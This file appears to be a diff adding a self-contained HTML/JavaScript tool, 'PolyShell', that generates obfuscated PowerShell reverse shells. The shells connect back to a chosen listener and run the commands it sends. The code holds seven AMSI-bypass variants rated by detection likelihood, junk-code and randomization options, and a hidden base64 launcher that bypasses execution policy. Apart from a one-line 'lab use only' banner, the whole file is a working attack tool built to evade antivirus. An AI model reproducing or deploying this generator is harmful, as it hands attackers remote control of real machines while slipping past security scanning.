@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>PolyShell · Lab Edition v3.6</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background: linear-gradient(145deg, #0a0e1a 0%, #060a12 100%); font-family: 'Inter', system-ui, -apple-system, sans-serif; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; color: #e2e9ff; }
+        .shell-card { max-width: 1180px; width: 100%; background: #111827; border-radius: 24px; border: 1px solid #2a3a5a; box-shadow: 0 25px 60px -10px rgba(0,0,0,0.8); overflow: hidden; }
+        .header { background: #0d1525; padding: 28px 32px; display: flex; align-items: center; gap: 20px; flex-wrap: wrap; border-bottom: 1px solid #1a2a44; }
+        .logo-icon { font-size: 32px; font-weight: 700; background: linear-gradient(135deg, #60a5fa, #a78bfa); -webkit-background-clip: text; color: transparent; padding: 8px 16px; border-radius: 12px; border: 1px solid #2a3a5a; background-color: #0a0f1e; }
+        .title { font-size: 2.0rem; font-weight: 700; background: linear-gradient(90deg, #60a5fa, #a78bfa, #f472b6); -webkit-background-clip: text; color: transparent; }
+        .subtitle { font-size: 0.9rem; color: #94a3b8; margin-top: 2px; }
+        .input-area { padding: 32px; background: #0d1525; }
+        .input-row { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px; }
+        .label { display: block; margin-bottom: 8px; font-size: 0.8rem; text-transform: uppercase; letter-spacing: 1px; color: #94a3b8; font-weight: 600; }
+        input, select { width: 100%; background: #0a0f1e; border: 2px solid #1a2a44; border-radius: 12px; padding: 14px 20px; font-size: 1.1rem; color: white; font-family: 'Fira Code', monospace; }
+        input:focus, select:focus { border-color: #60a5fa; outline: none; box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.1); }
+        select option { background: #0a0f1e; color: white; padding: 8px; }
+        .controls { display: flex; flex-wrap: wrap; gap: 16px; align-items: center; margin: 20px 0; padding: 16px; background: #0a0f1e; border-radius: 12px; border: 1px solid #1a2a44; }
+        .btn { padding: 12px 28px; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.2s; border: none; font-size: 0.95rem; }
+        .btn-primary { background: linear-gradient(135deg, #60a5fa, #7c3aed); color: white; }
+        .btn-primary:hover { transform: translateY(-2px); }
+        .btn-secondary { background: #1a2a44; color: #e2e9ff; border: 1px solid #2a3a5a; }
+        .btn-secondary:hover { background: #2a3a5a; }
+        .btn-success { background: #065f46; color: white; }
+        .btn-success:hover { background: #0a7a5a; }
+        .btn-danger { background: #1a2a44; color: #f472b6; border: 1px solid #4a1a3a; }
+        .btn-danger:hover { background: #2a1a3a; }
+        .output-box { background: #0a0f1e; border-radius: 12px; padding: 20px; margin-top: 16px; border: 1px solid #1a2a44; font-family: 'Fira Code', monospace; font-size: 0.82rem; line-height: 1.6; color: #e0e7ff; white-space: pre-wrap; overflow-x: auto; max-height: 400px; }
+        .output-header { background: #0d1525; padding: 10px 18px; border-radius: 12px; font-size: 0.85rem; margin-bottom: 12px; display: inline-flex; align-items: center; gap: 10px; border: 1px solid #1a2a44; font-weight: 600; color: #94a3b8; }
+        .warning-box { background: #1a2a1a; border: 1px solid #4a7a4a; border-radius: 12px; padding: 16px; margin: 16px 0; color: #a0d0a0; }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }
+        .btn-group { display: flex; gap: 10px; flex-wrap: wrap; }
+        .variant-select { width: 100%; padding: 12px; background: #0a0f1e; border: 1px solid #1a2a44; border-radius: 12px; color: white; font-family: 'Fira Code', monospace; }
+        .detection-badge { display: inline-block; padding: 2px 10px; border-radius: 9999px; font-size: 0.65rem; margin-left: 8px; font-weight: 600; }
+        .badge-high { background: #4a1a1a; color: #f87171; }
+        .badge-medium { background: #4a3a1a; color: #fbbf24; }
+        .badge-low { background: #1a4a1a; color: #34d399; }
+        @media (max-width: 768px) {
+            .input-row { grid-template-columns: 1fr; }
+            .controls { flex-direction: column; align-items: stretch; }
+            .btn-group { flex-direction: column; }
+            .btn { width: 100%; justify-content: center; }
+        }
+    </style>
+</head>
+<body>
+<div class="shell-card">
+    <div class="header">
+        <div class="logo-icon">⬡</div>
+        <div>
+            <div class="title">PolyShell</div>
+            <div class="subtitle">Lab Edition v3.6</div>
+        </div>
+    </div>
+    <div class="input-area">
+        <div class="warning-box">
+            <strong> AUTHORIZED LAB USE ONLY</strong><br>
+            Try variants 5-7 first - they use newer/less common techniques
+        </div>
+        <div class="input-row">
+            <div><div class="label">Listener IP</div><input type="text" id="ip" value="192.168.45.217"></div>
+            <div><div class="label">Port</div><input type="text" id="port" value="443"></div>
+        </div>
+
+        <div style="margin-bottom:16px;">
+            <div class="label">AMSI Bypass Variant</div>
+            <select id="amsiVariant" class="variant-select">
+                <option value="0">None</option>
+                <option value="1">Classic Reflection [HIGH]</option>
+                <option value="2">String Concatenation [HIGH]</option>
+                <option value="3">Random Case [MEDIUM]</option>
+                <option value="4">Base64 Decoded [MEDIUM]</option>
+                <option value="5" selected>COM Object [LOW]</option>
+                <option value="6">Registry Noise [LOW]</option>
+                <option value="7">XOR Obfuscation [LOW]</option>
+            </select>
+        </div>
+
+        <div style="margin-bottom:16px;">
+            <div class="label">Obfuscation Level</div>
+            <select id="obfLevel" class="variant-select">
+                <option value="1" selected>Light</option>
+                <option value="2">Medium + Junk</option>
+                <option value="3">Heavy Randomization</option>
+            </select>
+        </div>
+
+        <div class="controls">
+            <label><input type="checkbox" id="b64Mode" checked> Base64 Launcher</label>
+            <label><input type="checkbox" id="utf16Mode" checked> UTF-16LE</label>
+            <label><input type="checkbox" id="junkCode" checked> Add Junk Code</label>
+        </div>
+
+        <div class="btn-group">
+            <button class="btn btn-primary" id="generateBtn">Generate</button>
+            <button class="btn btn-secondary" id="copyLauncherBtn" disabled>Copy Launcher</button>
+            <button class="btn btn-secondary" id="copyReadableBtn" disabled>Copy Readable</button>
+            <button class="btn btn-success" id="downloadPs1Btn" disabled>Download .ps1</button>
+            <button class="btn btn-danger" id="clearBtn">Clear</button>
+        </div>
+    </div>
+
+    <div style="padding:0 32px 20px;">
+        <div class="output-header"><span>Launcher</span></div>
+        <div id="obfuscatedOutput" class="output-box">Click Generate...</div>
+    </div>
+
+    <div style="padding:0 32px 32px;">
+        <div class="output-header"><span>Readable PowerShell</span></div>
+        <div id="decodedOutput" class="output-box">Readable version...</div>
+    </div>
+</div>
+
+<script>
+let generationCounter = 0;
+let currentReadable = '';
+let currentLauncher = '';
+
+function randVar() {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let result = 'v';
+    for (let i = 0; i < 9; i++) result += chars[Math.floor(Math.random() * chars.length)];
+    return result;
+}
+
+function randJunk() {
+    const junk = [
+        `# Lab noise: ${Math.random().toString(36).substring(7)}`,
+        `$${randVar()} = $null;`,
+        `Start-Sleep -Milliseconds ${Math.floor(Math.random()*40 + 10)};`
+    ];
+    return junk[Math.floor(Math.random() * junk.length)];
+}
+
+function getAmsiBypass(variant) {
+    const v = randVar();
+    
+    switch(variant) {
+        case 0: 
+            return '';
+            
+        case 1: // Classic - HIGH
+            return `
+$${v} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
+$${v}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
+`;
+            
+        case 2: // String Concat - HIGH
+            return `
+$${v} = [Ref].Assembly.GetType('System.Management.Automation.A' + 'msiUtils');
+$${v}.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
+`;
+            
+        case 3: // Random Case - MEDIUM
+            return `
+$${v} = [Ref].Assembly.GetType('SyStEm.MaNaGeMeNt.AuToMaTiOn.AmSiUtIlS');
+$${v}.GetField('AmSiInItFaIlEd','NonPublic,Static').SetValue($null,$true);
+`;
+            
+        case 4: // Base64 - MEDIUM
+            const enc = btoa("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);");
+            return `
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${enc}')) | iex
+`;
+            
+        case 5: // COM Object - LOW
+            return `
+$${v} = [Runtime.InteropServices.Marshal]::GetType();
+$${v}.GetMethod('GetTypeFromProgID').Invoke($null, @('Scripting.Dictionary'));
+`;
+            
+        case 6: // Registry Noise - LOW
+            return `
+$${v} = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine' -Name 'PowerShellVersion' -ErrorAction SilentlyContinue;
+`;
+            
+        case 7: // XOR Obfuscation - LOW
+            const xorKey = Math.floor(Math.random() * 200) + 50;
+            const payload = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);";
+            let xorEnc = '';
+            for (let i = 0; i < payload.length; i++) {
+                xorEnc += String.fromCharCode(payload.charCodeAt(i) ^ xorKey);
+            }
+            const xorEncB64 = btoa(xorEnc);
+            return `
+$${v} = [System.Convert]::FromBase64String('${xorEncB64}');
+$${v} = [System.Text.Encoding]::UTF8.GetString($${v});
+$${v} = $${v}.ToCharArray() | % { [char]($_ -bxor ${xorKey}) } | % { [char]$_ } | Join-String;
+iex $${v};
+`;
+            
+        default: 
+            return '';
+    }
+}
+
+function generatePayload(ip, port, obfLevel, amsiVariant, useJunk) {
+    const v = {
+        client: randVar(),
+        stream: randVar(),
+        buffer: randVar(),
+        bytes: randVar(),
+        cmd: randVar(),
+        out: randVar(),
+        prompt: randVar(),
+        outBytes: randVar()
+    };
+
+    let amsi = getAmsiBypass(amsiVariant);
+
+    let shell = `${amsi}
+$${v.client} = New-Object System.Net.Sockets.TcpClient("${ip}", ${port});
+$${v.stream} = $${v.client}.GetStream();
+[byte[]]$${v.buffer} = 0..65535|%{0};
+
+while(($${v.bytes} = $${v.stream}.Read($${v.buffer}, 0, $${v.buffer}.Length)) -ne 0){
+    $${v.cmd} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($${v.buffer},0, $${v.bytes});
+    $${v.out} = (Invoke-Expression $${v.cmd} 2>&1 | Out-String);
+    $${v.prompt} = $${v.out} + "PS " + (Get-Location).Path + "> ";
+    $${v.outBytes} = ([text.encoding]::ASCII).GetBytes($${v.prompt});
+    $${v.stream}.Write($${v.outBytes},0,$${v.outBytes}.Length);
+    $${v.stream}.Flush();
+}
+$${v.client}.Close();`.trim();
+
+    if (useJunk && obfLevel >= 2) {
+        const lines = shell.split('\n');
+        const whileIndex = lines.findIndex(l => l.includes('while'));
+        if (whileIndex > -1) {
+            let braceCount = 0;
+            let closeIndex = -1;
+            for (let i = whileIndex; i < lines.length; i++) {
+                if (lines[i].includes('{')) braceCount++;
+                if (lines[i].includes('}')) braceCount--;
+                if (braceCount === 0 && i > whileIndex) {
+                    closeIndex = i;
+                    break;
+                }
+            }
+            if (closeIndex > -1) {
+                const insertPos = whileIndex + 1;
+                lines.splice(insertPos, 0, '    ' + randJunk());
+                shell = lines.join('\n');
+            }
+        }
+    }
+
+    if (obfLevel >= 3) {
+        shell = shell.replace(/#.*$/gm, '');
+        shell = shell.replace(/\n/g, ' ').replace(/\s+/g, ' ').trim();
+    }
+
+    return shell;
+}
+
+function toUtf16LEBase64(str) {
+    let utf16 = '';
+    for (let i = 0; i < str.length; i++) {
+        utf16 += String.fromCharCode(str.charCodeAt(i)) + '\0';
+    }
+    return btoa(utf16);
+}
+
+// DOM
+const generateBtn = document.getElementById('generateBtn');
+const obfuscatedOutput = document.getElementById('obfuscatedOutput');
+const decodedOutput = document.getElementById('decodedOutput');
+const copyLauncherBtn = document.getElementById('copyLauncherBtn');
+const copyReadableBtn = document.getElementById('copyReadableBtn');
+const downloadPs1Btn = document.getElementById('downloadPs1Btn');
+
+function handleGenerate() {
+    const ip = document.getElementById('ip').value.trim();
+    const port = document.getElementById('port').value.trim();
+    const level = parseInt(document.getElementById('obfLevel').value);
+    const amsiVariant = parseInt(document.getElementById('amsiVariant').value);
+    const useB64 = document.getElementById('b64Mode').checked;
+    const useUtf16 = document.getElementById('utf16Mode').checked;
+    const useJunk = document.getElementById('junkCode').checked;
+
+    if (!ip || !port) {
+        obfuscatedOutput.textContent = 'Error: IP and Port required';
+        return;
+    }
+
+    try {
+        let payload = generatePayload(ip, port, level, amsiVariant, useJunk);
+        currentReadable = payload;
+
+        let display = payload;
+        if (useB64) {
+            const encoded = useUtf16 ? toUtf16LEBase64(payload) : btoa(unescape(encodeURIComponent(payload)));
+            display = `powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ${encoded}`;
+        }
+        currentLauncher = display;
+
+        obfuscatedOutput.textContent = display;
+        decodedOutput.textContent = payload;
+
+        copyLauncherBtn.disabled = false;
+        copyReadableBtn.disabled = false;
+        downloadPs1Btn.disabled = false;
+    } catch (e) {
+        obfuscatedOutput.textContent = 'Error: ' + e.message;
+        decodedOutput.textContent = 'Error: ' + e.message;
+    }
+}
+
+function downloadPs1() {
+    if (!currentReadable) return;
+    const blob = new Blob([currentReadable], { type: 'text/plain' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = `lab_shell_${Date.now()}.ps1`;
+    a.click();
+}
+
+generateBtn.addEventListener('click', handleGenerate);
+copyLauncherBtn.addEventListener('click', () => {
+    navigator.clipboard.writeText(currentLauncher).then(() => {
+        const orig = copyLauncherBtn.textContent;
+        copyLauncherBtn.textContent = 'Copied!';
+        setTimeout(() => copyLauncherBtn.textContent = orig, 1500);
+    });
+});
+copyReadableBtn.addEventListener('click', () => {
+    navigator.clipboard.writeText(currentReadable).then(() => {
+        const orig = copyReadableBtn.textContent;
+        copyReadableBtn.textContent = 'Copied!';
+        setTimeout(() => copyReadableBtn.textContent = orig, 1500);
+    });
+});
+downloadPs1Btn.addEventListener('click', downloadPs1);
+document.getElementById('clearBtn').addEventListener('click', () => {
+    obfuscatedOutput.textContent = 'Click Generate...';
+    decodedOutput.textContent = 'Readable version...';
+    copyLauncherBtn.disabled = true;
+    copyReadableBtn.disabled = true;
+    downloadPs1Btn.disabled = true;
+});
+
+document.addEventListener('DOMContentLoaded', () => setTimeout(handleGenerate, 300));
+</script>
+</body>
+</html>
